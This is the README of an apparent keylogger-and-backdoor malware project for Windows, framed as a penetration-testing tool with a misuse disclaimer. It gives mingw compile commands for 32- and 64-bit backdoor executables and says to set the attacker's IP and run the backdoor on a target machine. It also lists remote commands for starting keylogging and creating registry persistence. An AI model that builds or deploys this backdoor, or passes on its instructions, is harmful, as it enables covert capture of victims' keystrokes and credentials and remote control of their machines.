# keylogger

Keylogger malware for penetration testing in Windows platforms. PLEASE USE WITH RESPONSABILITY. I AM NOT RESPONSABLE FOR MISUSE OF THIS SOFTWARE FOR ILLEGAL PURPOSES.

## Steps

1. Create connection with server (inside a main function)
2. Create shell function (wait for incoming command and iterate over certain options)
3. Automatically start program when machine is rebooted
4. Start/spawn other programs
5. Navigate through different directories
6. Implement keylogger to backdoor

## Compiling backdoor

### Install mingw

`sudo apt-get install mingw-w64`

### Win32

`i686-w64-mingw32-gcc -o backdoor_win32.exe backdoor.c -lwsock32 -lwininet`

### Win64

`x86_64-w64-mingw32-gcc -o backdoor_win64.exe backdoor.c -lwsock32 -lwininet`

## Compiling server

`gcc server.c -o server.o`

## Usage

Replace in both `server.c` and `backdoor.c` files the server IP address (the attacker) "xxx.xxx.x.xx" with the actual IP address, which can be retrieved using `ifconfig`.

After compiling, run `backdoor_win32.exe` or `backdoor_win64.exe` in the target machine, preferably Windows 7. On a Linux machine, preferably Kali Linux, run `server.o`.

### Commands

`keylog_start` - starts keylogger in target machine <br>
`persist` - creates persistence in target machine registry <br>
`q` - quit <br>
